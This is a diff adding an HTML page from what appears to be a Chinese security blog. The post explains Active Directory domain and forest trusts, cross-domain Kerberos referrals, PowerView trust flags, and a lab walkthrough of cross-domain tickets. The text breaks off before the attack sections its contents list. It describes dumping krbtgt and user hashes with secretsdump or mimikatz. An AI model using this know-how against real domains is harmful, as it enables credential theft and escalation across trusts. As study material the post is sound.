@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title> - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="" />
+<meta property="og:description" content="Trust Technologies: Domain and Forest Trusts | Microsoft Docs How Domain and Forest Trusts Work | Microsoft Docs It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts – Active Directory Security (adsecurity.org) A Guide to Attacking Domain Trusts | by Will Schroeder | Medium From Domain Admin to Enterprise Admin - Red Teaming Experiments (ired.team) Active Directory forest trusts part" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://songzhiv.github.io/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%B8%8E%E8%B7%A8%E5%9F%9F/" /><meta property="og:image" content="https://songzhiv.github.io/static/favicon.ico"/><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://songzhiv.github.io/static/favicon.ico"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Trust Technologies: Domain and Forest Trusts | Microsoft Docs How Domain and Forest Trusts Work | Microsoft Docs It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts – Active Directory Security (adsecurity.org) A Guide to Attacking Domain Trusts | by Will Schroeder | Medium From Domain Admin to Enterprise Admin - Red Teaming Experiments (ired.team) Active Directory forest trusts part"/>
+<meta name="application-name" content="柠檬k">
+<meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://songzhiv.github.io/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%B8%8E%E8%B7%A8%E5%9F%9F/" /><link rel="next" href="https://songzhiv.github.io/config/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/songzhiv.github.io\/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%B8%8E%E8%B7%A8%E5%9F%9F\/"
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  5779 ,
+        "url": "https:\/\/songzhiv.github.io\/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%B8%8E%E8%B7%A8%E5%9F%9F\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "nmk"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/cl/"> 文章收集 </a><a class="menu-item" href="/about/">  </a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Type to search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Type to search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/cl/" title="">文章收集</a><a class="menu-item" href="/about/" title=""></a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX"></h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5779 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 12 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础概念">基础概念</a></li>
+    <li><a href="#同一林的跨域kerberos认证">同一林的跨域Kerberos认证</a></li>
+    <li><a href="#不同林中的跨域kerberos认证">不同林中的跨域Kerberos认证</a></li>
+    <li><a href="#power-view">Power View</a>
+      <ul>
+        <li><a href="#trusttype">TrustType</a></li>
+        <li><a href="#trustattributes">TrustAttributes</a></li>
+        <li><a href="#trustdirection">TrustDirection</a></li>
+      </ul>
+    </li>
+    <li><a href="#4张票据">4张票据</a>
+      <ul>
+        <li><a href="#制作keytab">制作keytab</a></li>
+        <li><a href="#认证流程">认证流程</a></li>
+        <li><a href="#信任密钥">信任密钥</a></li>
+      </ul>
+    </li>
+    <li><a href="#sid筛选">SID筛选</a>
+      <ul>
+        <li><a href="#sidhistory">SIDHistory</a></li>
+        <li><a href="#过滤规则">过滤规则</a></li>
+      </ul>
+    </li>
+    <li><a href="#跨域">跨域</a>
+      <ul>
+        <li><a href="#跨域金票">跨域金票</a></li>
+        <li><a href="#非约束委派">非约束委派</a></li>
+        <li><a href="#信任账户攻击">信任账户攻击</a></li>
+        <li><a href="#黄金gmsa">黄金GMSA</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2003/cc759554%28v=ws.10%29?redirectedfrom=MSDN" target="_blank" rel="noopener noreffer">Trust Technologies: Domain and Forest Trusts | Microsoft Docs</a></p>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178%28v=ws.10%29?redirectedfrom=MSDN" target="_blank" rel="noopener noreffer">How Domain and Forest Trusts Work | Microsoft Docs</a></p>
+<p><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener noreffer">It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts – Active Directory Security (adsecurity.org)</a></p>
+<p><a href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d" target="_blank" rel="noopener noreffer">A Guide to Attacking Domain Trusts | by Will Schroeder | Medium</a></p>
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain" target="_blank" rel="noopener noreffer">From Domain Admin to Enterprise Admin - Red Teaming Experiments (ired.team)</a></p>
+<p><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noopener noreffer">Active Directory forest trusts part 1 - How does SID filtering work? - dirkjanm.io</a></p>
+<p><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts" target="_blank" rel="noopener noreffer">Attack Trusts - Pentester&rsquo;s Promiscuous Notebook (snovvcrash.rocks)</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 7) - Trust account attack - from trusting to trusted — Improsec | improving security</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent — Improsec | improving security</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent — Improsec | improving security</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 3) - SID filtering explained — Improsec | improving security</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-2-known-ad-attacks-from-child-to-parent" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 2) – Known AD attacks - from child to parent — Improsec | improving security</a></p>
+<h2 id="基础概念">基础概念</h2>
+<p>单项信任：A信任B，B不信任A。B的用户可以访问A的资源，A的用户不能访问B的资源</p>
+<p>双向信任：AB互相信任，AB用户可互相访问对方的资源。</p>
+<p>传递信任：AB互相信任，BC互相信任，且都是可传递的信任，AC就互相信任</p>
+<p>非传递信任：AB互相信任，BC互相信任，不是可传递的信任，AC就不互相信任</p>
+<p>同一林中子域与父域默认建立的是双向传递信任。</p>
+<p>外部信任不可传递</p>
+<p>林信任可传递</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414170526-ae45dx0.png"
+        data-srcset="assets/image-20220414170526-ae45dx0.png, assets/image-20220414170526-ae45dx0.png 1.5x, assets/image-20220414170526-ae45dx0.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414170526-ae45dx0.png"
+        title="image.png" /></p>
+<p>域<code>ADC</code>有两个子域。<code>A.ADC</code>和<code>B.ADC</code>。</p>
+<p><code>A.ADC</code>和<code>B.ADC</code>和父域<code>ADC.COM</code>都是双向传递信任。所以<code>A.ADC</code>和<code>B.ADC</code>也是双向传递信任，他们的子域也依然可以双向传递信任。</p>
+<p><code>BDC</code>与<code>A.ADC</code>双向信任。不可传递。</p>
+<p><code>CDC</code>与<code>ADC</code>双向林信任。可传递。CDC域中用户可以访问ADC的所有资源包括子域，由于外部信任不可传递，CDC不可访问BDC的资源</p>
+<p>微软官方文档的说明<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178%28v=ws.10%29?redirectedfrom=MSDN" target="_blank" rel="noopener noreffer">域和林信任如何工作 | 微软文档 (microsoft.com)</a></p>
+<h2 id="同一林的跨域kerberos认证">同一林的跨域Kerberos认证</h2>
+<p><figure><a class="lightgallery" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg" title="基于域信任的 Kerberos 身份验证过程" data-thumbnail="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg" data-sub-html="<h2>基于域信任的 Kerberos 身份验证过程</h2><p>基于域信任的 Kerberos 身份验证过程</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg"
+            data-srcset="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg 1.5x, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg 2x"
+            data-sizes="auto"
+            alt="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg" />
+    </a><figcaption class="image-caption">基于域信任的 Kerberos 身份验证过程</figcaption>
+    </figure></p>
+<ol>
+<li>User1 使用来自 europe.tailspintoys.com 域的凭据登录到 Workstation1。作为此过程的一部分，身份验证域控制器向用户 1 颁发一个授予票证 (TGT)。User1 需要此票证才能对资源进行身份验证。然后，用户尝试访问位于 asia.tailspintoys.com 域中的FileServer1上的共享资源 (\fileserver1\share)。</li>
+<li>Workstation1 联系其域 (ChildDC1) 中域控制器上的 Kerberos 密钥分发中心 (KDC) 并请求 FileServer1 服务主体名称 (SPN) 的服务票证。</li>
+<li>ChildDC1 在其域数据库中找不到 SPN，并查询全局编录以查看林中是否有任何域包含此 SPN。全局编录将请求的信息发送回 ChildDC1。</li>
+<li>ChildDC1 将推荐发送到 Workstation1。</li>
+<li>Workstation1 与 ForestRootDC1（其父域）中的域控制器联系，以获取对 Child2 域中域控制器 (ChildDC2) 的引用。ForestRootDC1 将引用发送到Workstation1。</li>
+<li>Workstation1 与 ChildDC2 上的 KDC 联系，并为用户协商一张票证以获取对 FileServer1 的访问权限。</li>
+<li>Workstation1 获得服务票证后，会将票证发送到 FileServer1，FileServer1 读取用户的安全凭证并相应地构造访问令牌。</li>
+</ol>
+<p>每个域都有自己的一组安全策略来管理对资源的访问。这些策略不会从一个域跨越到另一个域。</p>
+<h2 id="不同林中的跨域kerberos认证">不同林中的跨域Kerberos认证</h2>
+<p><figure><a class="lightgallery" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f%28ws.10%29.jpeg" title="基于林信任的 Kerberos 身份验证过程" data-thumbnail="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f(ws.10).jpeg" data-sub-html="<h2>基于林信任的 Kerberos 身份验证过程</h2><p>基于林信任的 Kerberos 身份验证过程</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f%28ws.10%29.jpeg"
+            data-srcset="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f%28ws.10%29.jpeg, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f%28ws.10%29.jpeg 1.5x, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f%28ws.10%29.jpeg 2x"
+            data-sizes="auto"
+            alt="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f(ws.10).jpeg" />
+    </a><figcaption class="image-caption">基于林信任的 Kerberos 身份验证过程</figcaption>
+    </figure></p>
+<ol>
+<li>User1 使用来自 europe.tailspintoys.com 域的凭据登录到 Workstation1。然后，用户尝试访问位于 usa.wingtiptoys.com 林中的 FileServer1 上的共享资源。</li>
+<li>Workstation1 联系其域 (ChildDC1) 中域控制器上的 Kerberos 密钥分发中心 (KDC) 并请求 FileServer1 SPN 的服务票证。</li>
+<li>ChildDC1 在其域数据库中找不到 SPN，并查询全局编录以查看 tailspintoys.com 林中的任何域是否包含此 SPN。因为全局编录仅限于其自己的林，所以找不到 SPN。然后，全局编录检查其数据库中有关与其林建立的任何林信任的信息，如果找到，它将林信任受信任域对象 (TDO) 中列出的名称后缀与目标 SPN 的后缀进行比较以查找一场比赛。找到匹配项后，全局编录会向 ChildDC1 提供路由提示。路由提示有助于将身份验证请求定向到目标林，并且仅在所有传统身份验证通道（本地域控制器和全局编录）都无法找到 SPN 时使用。</li>
+<li>ChildDC1 将其父域的引用发送回 Workstation1。</li>
+<li>Workstation1 与 ForestRootDC1（其父域）中的域控制器联系，以获取到 wingtiptoys.com 林的林根域中的域控制器 (ForestRootDC2) 的引用。</li>
+<li>Workstation1 联系wingtiptoys.com 森林中的ForestRootDC2 以获取所请求服务的服务票证。</li>
+<li>ForestRootDC2 联系其全局编录以查找 SPN，全局编录找到 SPN 的匹配项并将其发送回 ForestRootDC2。</li>
+<li>ForestRootDC2 然后将 usa.wingtiptoys.com 的推荐发送回 Workstation1。</li>
+<li>Workstation1 联系 ChildDC2 上的 KDC 并协商 User1 的票证以获得对 FileServer1 的访问权限。</li>
+<li>Workstation1 获得服务票证后，会将服务票证发送到 FileServer1，FileServer1 读取 User1 的安全凭证并相应地构造访问令牌。</li>
+</ol>
+<h2 id="power-view">Power View</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414112608-7y5fpyp.png"
+        data-srcset="assets/image-20220414112608-7y5fpyp.png, assets/image-20220414112608-7y5fpyp.png 1.5x, assets/image-20220414112608-7y5fpyp.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414112608-7y5fpyp.png"
+        title="image.png" /></p>
+<h3 id="trusttype">TrustType</h3>
+<p>信任类型</p>
+<ul>
+<li><strong>DOWNLEVEL</strong> (0x00000001) — 未运行 Active Directory 的受信任的 Windows 域。 在PowerView 中以<strong>WINDOWS_NON_ACTIVE_DIRECTORY</strong>的形式输出。</li>
+<li><strong>UPLEVEL</strong> (0x00000002) — 一个运行 Active Directory 的受信任的 Windows 域。在 PowerView 中输出为<strong>WINDOWS_ACTIVE_DIRECTORY 。</strong></li>
+<li><strong>MIT</strong> (0x00000003) — 运行非 Windows (*nix)、符合 RFC4120 的 Kerberos 分发的受信任域。由于 MIT 发布 RFC4120，这被标记为 MIT。</li>
+</ul>
+<h3 id="trustattributes">TrustAttributes</h3>
+<p>信任属性</p>
+<ul>
+<li><strong>NON_TRANSITIVE</strong> (0x00000001) — 不能传递使用信任。也就是说，如果 DomainA 信任 DomainB 而 DomainB 信任 DomainC，那么 DomainA 不会自动信任 DomainC。此外，如果信任是不可传递的，那么您将无法从非传递点的链上的信任中查询任何 Active Directory 信息。外部信任是隐含的不可传递的。</li>
+<li><strong>UPLEVEL_ONLY</strong> (0x00000002) — 只有 Windows 2000 操作系统和更新的客户端可以使用信任。</li>
+<li><strong>QUARANTING_DOMAIN</strong> (0x00000004) — SID 过滤已启用（稍后会详细介绍）。为简单起见，使用 PowerView输出为<strong>FILTER_SIDS 。</strong></li>
+<li><strong>FOREST_TRANSITIVE</strong> (0x00000008) — 至少运行域功能级别 2003 或更高级别的两个域林的根之间的跨林信任。</li>
+<li><strong>CROSS_ORGANIZATION</strong> (0x00000010) — 信任不属于组织的域或林，它添加了 OTHER_ORGANIZATION SID。这有点奇怪。我不记得在现场遇到过这个标志，但根据<a href="https://imav8n.wordpress.com/2008/07/30/trust-attribute-cross_organization-and-selective-auth/" target="_blank" rel="noopener noreffer">这篇文章</a>，这意味着启用了选择性身份验证安全保护。有关更多信息，请查看<a href="https://technet.microsoft.com/en-us/library/cc755321%28v=ws.10%29.aspx#w2k3tr_trust_security_zyzk" target="_blank" rel="noopener noreffer">此 MSDN 文档</a>。</li>
+<li><strong>WITHIN_FOREST</strong> (0x00000020) — 受信任域在同一个林中，表示父-&gt;子或交叉链接关系</li>
+<li><strong>TREAT_AS_EXTERNAL</strong> (0x00000040) — 出于信任边界的目的，信任将被视为外部信任。根据<a href="https://msdn.microsoft.com/en-us/library/cc223779.aspx" target="_blank" rel="noopener noreffer">文档</a>，“ <em>如果设置了此位，则出于 SID 过滤的目的，对域的跨林信任将被视为外部信任。</em>  <em><strong>跨林信任的过滤比外部信任更严格</strong></em>  <em>。此属性将那些跨林信任放松为等同于外部信任。</em> ” 这听起来很诱人，我不能 100% 确定此声明的安全含义¯_(ツ)_/¯ 但如果有任何新信息出现，我会更新这篇文章。</li>
+<li><strong>USES_RC4_ENCRYPTION</strong> (0x00000080) — 如果 TrustType 是 MIT，则指定支持 RC4 密钥的信任。</li>
+<li><strong>USES_AES_KEYS</strong> (0x00000100) — 未在链接的 Microsoft 文档中列出，但根据我在网上找到的<a href="http://krbdev.mit.edu/rt/Ticket/Display.html?id=5477" target="_blank" rel="noopener noreffer">一些文档</a>，它指定 AES 密钥用于加密 KRB TGT。<a href="https://retep998.github.io/doc/winapi/ntsecapi/constant.TRUST_ATTRIBUTE_TRUST_USES_AES_KEYS.html" target="_blank" rel="noopener noreffer"></a></li>
+<li><strong>CROSS_ORGANIZATION_NO_TGT_DELEGATION</strong> (0x00000200) — “<a href="https://msdn.microsoft.com/en-us/library/cc223779.aspx" target="_blank" rel="noopener noreffer"><em>如果设置了此位，则不得信任在此信任下授予的票证进行委托。</em></a>” 这在<a href="https://msdn.microsoft.com/en-us/library/cc233949.aspx" target="_blank" rel="noopener noreffer">[MS-KILE] 3.3.5.7.5</a>（跨域信任和推荐）中有更多描述。</li>
+<li><strong>PIM_TRUST</strong> (0x00000400) —“<a href="https://msdn.microsoft.com/en-us/library/cc223779.aspx" target="_blank" rel="noopener noreffer"><em>如果设置了此位和 TATE（视为外部）位，则出于 SID 过滤的目的，对域的跨林信任将被视为特权身份管理信任。</em></a>” 根据<a href="https://msdn.microsoft.com/en-us/library/cc237940.aspx" target="_blank" rel="noopener noreffer">[MS-PAC] 4.1.2.2</a>（SID 过滤和声明转换），“<a href="https://msdn.microsoft.com/en-us/library/cc237940.aspx" target="_blank" rel="noopener noreffer"><em>域可以由林外的域进行外部管理。信任域允许其林本地的 SID 通过 PrivilegedIdentityManagement 信任。</em></a>” 虽然我在现场没有看到这个，而且它只支持域功能级别 2012R2 及更高版本，但它也值得进一步调查:)</li>
+</ul>
+<h3 id="trustdirection">TrustDirection</h3>
+<p>信任方向：</p>
+<p>Bidirectional： 双向</p>
+<p>Outbound：对外信任，外部域可访问本域</p>
+<p>inbound：对内信任 ，本域可访问外部域</p>
+<h2 id="4张票据">4张票据</h2>
+<h3 id="制作keytab">制作keytab</h3>
+<p>wireshark可以导入keytab文件来解密Kerberos认证中加密的数据。keytab就类似一个密码表。因为PAC是用krbtgt的hash加密，所以我们有了krbtgt的hash，制作keytab，导入wireshark就可以看见PAC中的每个结构了。</p>
+<p><a href="https://mp.weixin.qq.com/s/eTiQRoEh1DvNGEuPErYsAw" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/eTiQRoEh1DvNGEuPErYsAw</a>。这篇文章讲了通过ntds.dit和system.hive来制作keytab，经过我的测试有不少坑。不同版本的Windows Server，ntds.dit的结构不一样。如果你的域控是Windows server 2008。可以试试这种方法，我搞了大半天。最终也没成功。</p>
+<p>我更推荐dirkjanm的脚本，<a href="https://github.com/dirkjanm/forest-trust-tools" target="_blank" rel="noopener noreffer">dirkjanm/forest-trust-tools: Proof-of-concept tools for my AD Forest trust research (github.com)</a></p>
+<p>我们可以使用secretsdump或者mimikatz挨个导出我们需要的在用户hash。</p>
+<p>然后添加到keytab.py中112行。</p>
+<p>运行keytab.py生成keytab文件。导入wireshark即可解密Kerberos认证中的各个结构。</p>
+<h3 id="认证流程">认证流程</h3>
+<p>在<code>B.ADC</code>运行<code>Get-DomainComputer -domain a.adc.com</code> 查询A.ADC中的计算机</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414121726-ps4jsst.png"
+        data-srcset="assets/image-20220414121726-ps4jsst.png, assets/image-20220414121726-ps4jsst.png 1.5x, assets/image-20220414121726-ps4jsst.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414121726-ps4jsst.png"
+        title="image.png" /></p>
+<p>klist查看当前票据。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414113744-l5a5cvp.png"
+        data-srcset="assets/image-20220414113744-l5a5cvp.png, assets/image-20220414113744-l5a5cvp.png 1.5x, assets/image-20220414113744-l5a5cvp.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414113744-l5a5cvp.png"
+        title="image.png" /></p>
+<p>IIS01是A.ADC域控，IIS02是B.ADC 域控，DC01是父域ADC域控</p>
+<p>一共4个票据。首先第三个票据（<code>#2</code>）是B.ADC域管的TGT。</p>
+<p><strong>第二个票据</strong>：</p>
+<p>客户端: Administrator @ B.ADC.COM<br>
+服务器: krbtgt/ADC.COM @ B.ADC.COM</p>
+<p>调用的KDC是B.ADC的域控。</p>
+<p>也就是说请求者先拿着自己的TGT（第三张票据）去找自己的域控（B.ADC）请求A.ADC的服务（这里是<code>ldap/IIS01.A.adc.com</code>）。域控发现这个服务是另一个子域的。就用自己与父域的信任密钥加密TGT，返回给我们，让我们去找父域ADC。返回的这张票据就是第二张票据</p>
+<p><strong>第一张票据</strong>：</p>
+<p>客户端: Administrator @ B.ADC.COM<br>
+服务器: krbtgt/A.ADC.COM @ ADC.COM</p>
+<p>调用的 KDC: DC01.adc.com</p>
+<p>拿着第二张票据去父域请求A.ADC的跨域TGT。这个也就是我们抓到的第一个TGS-REQ。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414122223-9sn81yj.png"
+        data-srcset="assets/image-20220414122223-9sn81yj.png, assets/image-20220414122223-9sn81yj.png 1.5x, assets/image-20220414122223-9sn81yj.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414122223-9sn81yj.png"
+        title="image.png" /></p>
+<p>TGS-REP返回的就是第一张票据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414122421-fawisfs.png"
+        data-srcset="assets/image-20220414122421-fawisfs.png, assets/image-20220414122421-fawisfs.png 1.5x, assets/image-20220414122421-fawisfs.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414122421-fawisfs.png"
+        title="image.png" /></p>
+<p><strong>第四张票据</strong></p>
+<p>客户端: Administrator @ B.ADC.COM<br>
+服务器: ldap/IIS01.A.adc.com/A.adc.com @ A.ADC.COM<br>
+调用的 KDC: IIS01.A.adc.com</p>
+<p>拿着父域给的跨域TGT，去A.ADC请求对应服务的ST。</p>
